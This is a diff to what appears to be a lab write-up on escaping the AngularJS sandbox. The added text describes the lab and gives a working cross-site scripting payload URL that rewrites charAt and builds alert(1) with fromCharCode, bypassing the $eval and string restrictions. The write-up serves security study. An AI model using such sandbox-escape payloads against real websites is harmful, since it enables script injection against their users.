@@ -317,15 +317,23 @@ You Have a Search Funtion and search like asif and intercept the request and san
  
  You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in Angular JS sandbox
  
-     <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
-                            $scope.query = {};
-                            var key = 'search';
-                            $scope.query[key] = 'asif';
-                            $scope.value = $parse(key)($scope.query);
-                        });</script>
+    <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = 'asif';
+    $scope.value = $parse(key)($scope.query);
+    });</script>
  
  
+ This website uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS
  
+ The website, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
+ 
+ ## This is vulnerably
+ 
+ ## Exploit 
+ 
+     example.com/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
  
  
  
